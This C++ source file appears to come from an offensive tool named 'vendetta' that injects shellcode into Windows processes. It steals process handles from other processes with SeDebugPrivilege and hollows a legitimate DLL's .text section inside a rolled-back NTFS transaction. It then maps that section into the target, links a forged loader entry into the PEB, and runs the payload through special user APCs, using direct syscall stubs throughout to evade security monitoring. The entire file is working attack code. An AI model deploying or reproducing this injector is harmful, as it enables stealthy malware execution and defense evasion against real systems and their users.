#include "vendetta.h"

#include <utility>
#include "signatures.h"

namespace vendetta
{
	namespace
	{
		struct Pattern
		{
			std::string signature;
			std::vector<int> bytes;

			explicit Pattern(const std::string& sig) : signature(sig),
				bytes(ParsePattern(sig))
			{
			}

			static std::vector<int> ParsePattern(const std::string& pattern)
			{
				std::vector<int> result;
				std::istringstream iss(pattern);
				std::string token;

				while (iss >> token)
				{
					if (token == "?")
					{
						result.push_back(-1);
						continue;
					}
					result.push_back(std::stoi(token, nullptr, 16));
				}

				return result;
			}
		};

		MODULEENTRY32W GetModuleEntry32W(const wchar_t* moduleName,
			const PROCESS_INFORMATION& pi)
		{
			const HANDLE hSnap = CreateToolhelp32Snapshot(
				TH32CS_SNAPMODULE, pi.dwProcessId);
			if (hSnap == INVALID_HANDLE_VALUE)
				return {};

			MODULEENTRY32W me32 = {};
			me32.dwSize = sizeof(MODULEENTRY32W);
			if (Module32FirstW(hSnap, &me32))
			{
				do
				{
					if (wcscmp(me32.szModule, moduleName) == 0)
					{
						CloseHandle(hSnap);
						return me32;
					}
				} while (Module32NextW(hSnap, &me32));
			}
			CloseHandle(hSnap);
			return {};
		}

		bool EnableDebugPrivilege() {
			HANDLE hToken;
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
				return false;

			LUID luid;
			if (!LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &luid)) {
				CloseHandle(hToken);
				return false;
			}

			TOKEN_PRIVILEGES tp;
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
				CloseHandle(hToken);
				return false;
			}

			CloseHandle(hToken);
			return (GetLastError() == ERROR_SUCCESS);
		}

		BYTE GetProcessObjectTypeIndex() {
			HANDLE hSelf = GetCurrentProcess();
			HANDLE hRealSelf = nullptr;
			// Create a specific handle to ourselves to search for
			Sw3NtDuplicateObject(GetCurrentProcess(), hSelf, GetCurrentProcess(), &hRealSelf, 0, 0, DUPLICATE_SAME_ACCESS);

			ULONG size = 0x10000;
			PSYSTEM_HANDLE_INFORMATION_EX info;
			NTSTATUS status;
			BYTE typeIndex = 0;

			do {
				info = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
					nullptr, size, MEM_COMMIT, PAGE_READWRITE));
				status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, info, size, &size);
				if (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH)) {
					VirtualFree(info, 0, MEM_RELEASE);
					size *= 2;
				}
			} while (status == STATUS_INFO_LENGTH_MISMATCH);

			if (NT_SUCCESS(status) && info) {
				DWORD myPID = GetCurrentProcessId();
				for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
					// Check if this entry matches our PID and our Handle value
					if (info->Handles[i].UniqueProcessId == UlongToHandle(myPID) &&
						info->Handles[i].HandleValue == hRealSelf) {

						typeIndex = (BYTE)info->Handles[i].ObjectTypeIndex;
						break;
					}
				}
			}

			if (info) VirtualFree(info, 0, MEM_RELEASE);
			Sw3NtClose(hRealSelf);
			return typeIndex;
		}

		PVOID FindSignature(const PROCESS_INFORMATION& pi,
			const wchar_t* moduleName, Pattern pattern)
		{
			std::println("[*] Looking for pattern: {}...", pattern.signature);

			MODULEENTRY32W me32 = GetModuleEntry32W(moduleName, pi);
			if (me32.modBaseAddr == nullptr)
				return nullptr;
			BYTE* baseAddress = me32.modBaseAddr;
			const DWORD moduleSize = me32.modBaseSize;

			std::vector<byte> memBuffer(moduleSize);
			SIZE_T bytesRead;
			NTSTATUS status = Sw3NtReadVirtualMemory(
				pi.hProcess,
				baseAddress,
				memBuffer.data(),
				moduleSize,
				&bytesRead
			);
			if (!NT_SUCCESS(status) || bytesRead == 0)
			{
				std::println("[-] Sw3NtReadVirtualMemory failed. Error = {:x}",
					status);
				return nullptr;
			}

			for (size_t i = 0; i <= bytesRead - pattern.bytes.size(); ++i)
			{
				bool found = true;
				for (size_t j = 0; j < pattern.bytes.size(); ++j)
				{
					if (pattern.bytes[j] != -1 && memBuffer[i + j] != static_cast<
						byte>(pattern.bytes[j]))
					{
						found = false;
						break;
					}
				}
				if (found)
				{
					PVOID matchAddress = baseAddress + i;
					std::println("[+] Pattern found at address: {:p}",
						matchAddress);
					return matchAddress;
				}
			}
			return nullptr;
		}

		bool execute_hijack_thread_apc_instant(const PROCESS_INFORMATION& pi,
			const PPS_APC_ROUTINE
			base_address,
			const PVOID arg1 = nullptr,
			const PVOID arg2 = nullptr,
			const PVOID arg3 = nullptr)
		{
			NTSTATUS status;

			const HANDLE h_snap = CreateToolhelp32Snapshot(
				TH32CS_SNAPTHREAD, pi.dwProcessId);
			if (h_snap == INVALID_HANDLE_VALUE)
			{
				std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
					GetLastError());
				return false;
			}

			THREADENTRY32 te32;
			te32.dwSize = sizeof(THREADENTRY32);
			if (!Thread32First(h_snap, &te32))
			{
				std::println("[-] Thread32First failed. Error = {}",
					GetLastError());
				CloseHandle(h_snap);
				return false;
			}

			auto h_thread_hijacked = INVALID_HANDLE_VALUE;
			do
			{
				if (te32.th32OwnerProcessID == pi.dwProcessId)
				{
					CLIENT_ID client_id;
					client_id.UniqueProcess = UlongToHandle(te32.
						th32OwnerProcessID);
					client_id.UniqueThread = UlongToHandle(te32.
						th32ThreadID);

					OBJECT_ATTRIBUTES obj_attr = {};
					obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);

					status = Sw3NtOpenThread(&h_thread_hijacked,
						THREAD_ALL_ACCESS,
						&obj_attr, &client_id);
					if (!NT_SUCCESS(status))
					{
						std::println("[-] Sw3NtOpenThread failed. Error = {}",
							status);
						CloseHandle(h_snap);
						return false;
					}
					break;
				}
			} while (Thread32Next(h_snap, &te32));
			if (h_thread_hijacked == INVALID_HANDLE_VALUE)
			{
				std::println(
					"[-] Sw3NtOpenThread failed. Error = no thread was found.");
				return false;
			}

			std::println(
				"[*] Queueing Apc with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC.TID = {}.",
				te32.th32ThreadID);
			status = Sw3NtQueueApcThreadEx(h_thread_hijacked,
				UlongToHandle(
					QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC),
				base_address,
				arg1, arg2, arg3);
			if (!NT_SUCCESS(status))
			{
				std::println("[-] Sw3NtQueueApcThreadEx failed. Error = {}",
					status);
				CloseHandle(h_thread_hijacked);
				return false;
			}

			Sw3NtClose(h_thread_hijacked);
			return true;
		}

		bool link_module_to_peb(const PROCESS_INFORMATION& pi,
			const PVOID module_base_address,
			const PVOID module_entry_point,
			const ULONG image_size,
			const std::wstring& image_path)
		{
			Pattern ldrp_pattern(PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY);
			PVOID remote_ldrp_func = FindSignature(
				pi, L"ntdll.dll", ldrp_pattern);

			if (!remote_ldrp_func)
			{
				std::println("[-] Failed to find LdrpInsertDataTableEntry.");
				return false;
			}

			std::wstring base_name = image_path.substr(
				image_path.find_last_of('\\') + 1);
			std::wstring full_name = image_path;
			DWORD base_name_size = static_cast<DWORD>((base_name.length() + 1) *
				sizeof(wchar_t));
			DWORD full_name_size = static_cast<DWORD>((full_name.length() + 1) *
				sizeof(wchar_t));

			DWORD ddag_size = sizeof(LDR_DDAG_NODE);
			DWORD entry_size = sizeof(LDR_DATA_TABLE_ENTRY);
			DWORD total_size = entry_size + base_name_size + full_name_size +
				ddag_size;

			PVOID remote_memory = nullptr;
			SIZE_T region_size = total_size;

			NTSTATUS status = Sw3NtAllocateVirtualMemory(
				pi.hProcess, &remote_memory, 0,
				&region_size,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_READWRITE);
			if (!NT_SUCCESS(status))
			{
				std::println("[-] Allocation failed: {:x}", status);
				return false;
			}

			uintptr_t addr_entry = reinterpret_cast<uintptr_t>(remote_memory);
			uintptr_t addr_base_str = addr_entry + entry_size;
			uintptr_t addr_full_str = addr_base_str + base_name_size;
			uintptr_t addr_ddag = addr_full_str + full_name_size;

			LDR_DATA_TABLE_ENTRY local_entry = { nullptr };
			LDR_DDAG_NODE local_ddag = { nullptr };

			local_ddag.State = LdrModulesReadyToRun;
			local_ddag.LoadCount = 0xFFFFFFFF;
			local_ddag.Modules.Flink = reinterpret_cast<PLIST_ENTRY>(addr_ddag +
				offsetof(LDR_DDAG_NODE, Modules));
			local_ddag.Modules.Blink = reinterpret_cast<PLIST_ENTRY>(addr_ddag +
				offsetof(LDR_DDAG_NODE, Modules));

			local_entry.DllBase = module_base_address;
			local_entry.SizeOfImage = image_size;
			local_entry.EntryPoint = module_entry_point;
			local_entry.TlsIndex = 0;
			local_entry.ObsoleteLoadCount = 0xFFFF;
			local_entry.ReferenceCount = 0xFFFFFFFF;
			local_entry.Flags = LDRP_DONT_CALL_FOR_THREADS; // default flag is shit because loader executes the dll "randomly"

			local_entry.BaseDllName.Length = static_cast<USHORT>(base_name_size
				- sizeof(wchar_t));
			local_entry.BaseDllName.MaximumLength = static_cast<USHORT>(
				base_name_size);
			local_entry.BaseDllName.Buffer = reinterpret_cast<PWSTR>(
				addr_base_str);

			local_entry.FullDllName.Length = static_cast<USHORT>(full_name_size
				- sizeof(wchar_t));
			local_entry.FullDllName.MaximumLength = static_cast<USHORT>(
				full_name_size);
			local_entry.FullDllName.Buffer = reinterpret_cast<PWSTR>(
				addr_full_str);

			local_entry.DdagNode = reinterpret_cast<PLDR_DDAG_NODE>(addr_ddag);
			local_entry.HashLinks.Flink = nullptr;
			local_entry.HashLinks.Blink = nullptr;

			Sw3NtWriteVirtualMemory(pi.hProcess,
				reinterpret_cast<PVOID>(addr_entry),
				&local_entry, sizeof(LDR_DATA_TABLE_ENTRY),
				nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
				reinterpret_cast<PVOID>(addr_base_str),
				base_name.data(), base_name_size, nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
				reinterpret_cast<PVOID>(addr_full_str),
				full_name.data(), full_name_size, nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
				reinterpret_cast<PVOID>(addr_ddag),
				&local_ddag, sizeof(LDR_DDAG_NODE),
				nullptr);

			std::println(
				"[+] Memory allocated and LDR entry written.");

			if (!execute_hijack_thread_apc_instant(
				pi, static_cast<PPS_APC_ROUTINE>(remote_ldrp_func),
				reinterpret_cast<PVOID>(addr_entry)))
			{
				std::println("[-] Failed to queue apc for linking.");
				return false;
			}

			std::println(
				"[+] Linked successfully via direct LdrpInsertDataTableEntry call.");
			return true;
		}
	}

	bool inject_phantom_dll(const PROCESS_INFORMATION& pi, const BYTE* buf,
		SIZE_T buf_size,
		const std::wstring& legitimate_dll_path)
	{
		if (legitimate_dll_path.empty())
		{
			std::println("[-] Legitimate DLL path required for hollowing.");
			return false;
		}

		std::println("[*] Reading Legitimate DLL: {}",
			std::string(legitimate_dll_path.begin(),
				legitimate_dll_path.end()));

		const HANDLE hFile = CreateFileW(legitimate_dll_path.c_str(),
			GENERIC_READ, FILE_SHARE_READ,
			nullptr, OPEN_EXISTING, 0,
			nullptr);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			std::println("[-] Failed to open legitimate DLL: {}",
				GetLastError());
			return false;
		}

		DWORD fileSize = GetFileSize(hFile, nullptr);
		std::vector<BYTE> pe_buffer(fileSize);
		DWORD bytesRead = 0;
		if (!ReadFile(hFile, pe_buffer.data(), fileSize, &bytesRead,
			nullptr))
		{
			std::println("[-] ReadFile failed.");
			CloseHandle(hFile);
			return false;
		}
		CloseHandle(hFile);

		auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_buffer.data());
		if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return false;

		auto pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos
			->e_lfanew);
		if (pNt->Signature != IMAGE_NT_SIGNATURE) return false;

		auto pSection = IMAGE_FIRST_SECTION(pNt);
		PIMAGE_SECTION_HEADER pTextSection = nullptr;

		for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
		{
			if (strncmp(reinterpret_cast<char*>(pSection[i].Name), ".text",
				5) == 0)
			{
				pTextSection = &pSection[i];
				break;
			}
		}

		if (!pTextSection)
		{
			std::println("[-] .text section not found in legitimate DLL.");
			return false;
		}

		if (buf_size > pTextSection->SizeOfRawData)
		{
			std::println(
				"[-] Shellcode ({} bytes) is too large for .text section ({} bytes).",
				buf_size, pTextSection->SizeOfRawData);
			return false;
		}

		HANDLE hTransaction;
		OBJECT_ATTRIBUTES obj_attr = { sizeof(OBJECT_ATTRIBUTES) };

		NTSTATUS status = Sw3NtCreateTransaction(
			&hTransaction,
			TRANSACTION_ALL_ACCESS,
			&obj_attr,
			nullptr, nullptr, 0, 0, 0, nullptr, nullptr
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtCreateTransaction failed: {:x}", status);
			return false;
		}
		std::println("[+] Transaction created.");

		HANDLE hTransactedFile = CreateFileTransactedW(
			legitimate_dll_path.c_str(),
			GENERIC_WRITE | GENERIC_READ,
			FILE_SHARE_READ,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			nullptr,
			hTransaction,
			nullptr,
			nullptr
		);
		if (hTransactedFile == INVALID_HANDLE_VALUE)
		{
			std::println("[-] CreateFileTransactedW failed: {}",
				GetLastError());
			Sw3NtClose(hTransaction);
			return false;
		}

		std::println("[*] Patching .text section in memory...");
		memcpy(pe_buffer.data() + pTextSection->PointerToRawData, buf,
			buf_size);

		std::println("[+] Writing patched PE content to transaction...");

		IO_STATUS_BLOCK io_status;
		LARGE_INTEGER byteOffset = {};

		status = Sw3NtWriteFile(
			hTransactedFile,
			nullptr, nullptr, nullptr,
			&io_status,
			pe_buffer.data(),
			static_cast<ULONG>(pe_buffer.size()),
			&byteOffset,
			nullptr
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtWriteFile failed: {:x}", status);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}

		// hTransactedFile validates headers (which are valid because they were copied from the real DLL)
		HANDLE hSection = nullptr;
		status = Sw3NtCreateSection(
			&hSection,
			SECTION_ALL_ACCESS,
			nullptr,
			nullptr,
			PAGE_READONLY,
			SEC_IMAGE,
			hTransactedFile
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtCreateSection failed: {:x}", status);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}

		PVOID remoteBase = nullptr;
		SIZE_T viewSize = 0;

		status = Sw3NtMapViewOfSection(
			hSection,
			pi.hProcess,
			&remoteBase,
			0, 0, nullptr,
			&viewSize,
			ViewUnmap,
			0,
			PAGE_EXECUTE_READ
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtMapViewOfSection failed: {:x}", status);
			Sw3NtClose(hSection);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}
		std::println("[+] Section created and mapped to the target process.");

		Sw3NtClose(hSection);
		CloseHandle(hTransactedFile); // Close Win32 handle with CloseHandle
		// Using Native Rollback
		status = Sw3NtRollbackTransaction(hTransaction, TRUE);
		if (!NT_SUCCESS(status))
		{
			std::println(
				"[-] Sw3NtRollbackTransaction failed (Warning): {:x}",
				status);
		}
		Sw3NtClose(hTransaction); // Close Native handle with Sw3NtClose
		std::println("[+] Transaction rolled back successfully.");

		std::println("[+] Mapped Base Address: {}", remoteBase);

		PVOID executionAddress = static_cast<PBYTE>(remoteBase) +
			pTextSection->
			VirtualAddress;

		std::println("[+] Linking phantom dll to PEB...");

		auto pNtRemote = reinterpret_cast<PIMAGE_NT_HEADERS>(
			pe_buffer.data() +
			pDos->e_lfanew);
		ULONG image_size = pNtRemote->OptionalHeader.SizeOfImage;

		if (!link_module_to_peb(pi, remoteBase, executionAddress, image_size,
			legitimate_dll_path))
		{
			std::println("[-] Failed to link phantom dll to PEB.");
			return false;
		}

		// execute via apc instant
		if (!execute_hijack_thread_apc_instant(pi, static_cast<PPS_APC_ROUTINE>(executionAddress)))
		{
			std::println("[-] Failed execute the entrypoint via APC.");
			return false;
		}

		return true;
	}


	HANDLE hijack_process_handle(const DWORD target_pid)
	{
		if (!EnableDebugPrivilege()) {
			std::println("[-] Failed to grant SeDebug. Handle hijacking will not be available.");
			return INVALID_HANDLE_VALUE;
		}

		BYTE processTypeIndex = GetProcessObjectTypeIndex();
		if (processTypeIndex == 0) {
			std::println("[-] Failed to resolve Process Object Type Index.");
			return INVALID_HANDLE_VALUE;
		}
		std::println("[*] Process Type Index: {}", processTypeIndex);

		ULONG buffer_size = 0x10000;
		PSYSTEM_HANDLE_INFORMATION_EX handleInfo = nullptr;
		NTSTATUS status;

		do {
			handleInfo = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
				nullptr, buffer_size, MEM_COMMIT, PAGE_READWRITE));
			if (!handleInfo) return INVALID_HANDLE_VALUE;

			status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, buffer_size, &buffer_size);
		} while (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH));

		if (!NT_SUCCESS(status) || !handleInfo) {
			std::println("[-] Query failed: {:x}", status);
			if (handleInfo) VirtualFree(handleInfo, 0, MEM_RELEASE);
			return INVALID_HANDLE_VALUE;
		}

		auto hHijacked = INVALID_HANDLE_VALUE;

		for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
			const auto& entry = handleInfo->Handles[i];

			if (entry.UniqueProcessId == UlongToHandle(target_pid)) continue;
			if (entry.UniqueProcessId == UlongToHandle(0) || entry.UniqueProcessId == UlongToHandle(4)) continue;

			if (entry.ObjectTypeIndex != processTypeIndex) continue;

			if ((entry.GrantedAccess & PROCESS_VM_WRITE) == 0) continue;

			HANDLE hOwner = nullptr;
			OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
			CLIENT_ID clientId;

			clientId.UniqueProcess = entry.UniqueProcessId;
			clientId.UniqueThread = nullptr;

			status = Sw3NtOpenProcess(&hOwner, PROCESS_DUP_HANDLE, &objAttr, &clientId);
			if (!NT_SUCCESS(status)) continue;

			HANDLE hDup = nullptr;
			status = Sw3NtDuplicateObject(
				hOwner,
				entry.HandleValue,
				GetCurrentProcess(),
				&hDup,
				0,
				0,
				DUPLICATE_SAME_ACCESS
			);

			Sw3NtClose(hOwner);

			if (NT_SUCCESS(status)) {
				// Verify
				if (GetProcessId(hDup) == target_pid) {
					std::println("[+] Hijacked handle from PID: {} (Handle: {:p}, Access: {:x})",
						reinterpret_cast<uintptr_t>(entry.UniqueProcessId), static_cast<PVOID>(entry.HandleValue), static_cast<unsigned int>(entry.GrantedAccess));

					hHijacked = hDup;
					break;
				}
				Sw3NtClose(hDup);
			}
		}

		VirtualFree(handleInfo, 0, MEM_RELEASE);
		return hHijacked;
	}

	injector::~injector()
	{
		if (pi_.hThread && pi_.hThread != INVALID_HANDLE_VALUE)
			CloseHandle(
				pi_.hThread);
		if (pi_.hProcess && pi_.hProcess != INVALID_HANDLE_VALUE)
			CloseHandle(
				pi_.hProcess);
	}

	bool injector::create_process(const LPCSTR& benign_dll, const bool create_suspended)
	{
		if (!CreateProcessA(
			benign_dll,
			nullptr, nullptr, nullptr, FALSE,
			create_suspended ? CREATE_SUSPENDED : 0,
			nullptr, nullptr, &si_, &pi_))
		{
			return false;
		}
		std::println("[*] Dummy process created. Pid = {}", pi_.dwProcessId);

		return true;
	}

	bool injector::attach_to_process(const DWORD pid, const retrieve_handle_method handle_method)
	{
		pi_.dwProcessId = pid;

		switch (handle_method)
		{
		case hijack_handle:
			pi_.hProcess = hijack_process_handle(pid);
			break;
		case open_handle:
			CLIENT_ID client_id;
			client_id.UniqueProcess = UlongToHandle(pi_.dwProcessId);
			client_id.UniqueThread = nullptr;

			OBJECT_ATTRIBUTES obj_attr = { 0 };
			obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);

			NTSTATUS status = Sw3NtOpenProcess(
				&pi_.hProcess, PROCESS_ALL_ACCESS, &obj_attr,
				&client_id);
			if (!NT_SUCCESS(status))
			{
				std::println("[-] Sw3NtOpenProcess failed. Error = {}",
					status);
				return false;
			}
			if (pi_.hProcess == INVALID_HANDLE_VALUE)

			{
				std::println("[-] OpenProcess failed. Error = {}",
					GetLastError());
				return false;
			}
			break;
		}
		return true;
	}

	bool injector::attach_to_process_by_name(const std::wstring& process_name, const retrieve_handle_method handle_method)
	{
		std::string process_name_str(process_name.begin(),
			process_name.end());

		const HANDLE h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (h_snap == INVALID_HANDLE_VALUE)
		{
			std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
				GetLastError());
			return false;
		}

		PROCESSENTRY32 pe32 = { 0 };
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(h_snap, &pe32))
		{
			std::println("[-] Process32First failed. Error = {}",
				GetLastError());
			CloseHandle(h_snap);
			return false;
		}

		do
		{
			if (process_name == pe32.szExeFile)
			{
				std::println("[+] Found {}.", process_name_str);
				pi_.dwProcessId = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(h_snap, &pe32));
		CloseHandle(h_snap);
		if (pi_.dwProcessId == 0)
		{
			std::println("[-] Could not find {}.", process_name_str);
			return false;
		}

		attach_to_process(pe32.th32ProcessID, handle_method);
		std::println("[+] Attached to {}. PID = {}.", process_name_str,
			pe32.th32ProcessID);

		return true;
	}

	bool injector::inject(const std::wstring& benign_dll)
		const
	{
		return inject_phantom_dll(
			pi_, buf_, buf_size_, benign_dll);
	}
}